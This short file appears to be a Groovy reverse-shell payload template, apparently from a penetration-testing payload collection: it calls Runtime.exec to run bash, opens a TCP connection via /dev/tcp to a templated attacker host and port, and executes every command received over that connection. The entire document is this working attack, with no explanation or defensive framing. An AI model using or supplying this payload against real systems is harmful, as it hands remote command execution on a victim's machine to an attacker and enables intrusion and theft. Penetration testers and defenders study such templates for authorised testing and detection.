r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{{ host.ip }}/{{ host.port }};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
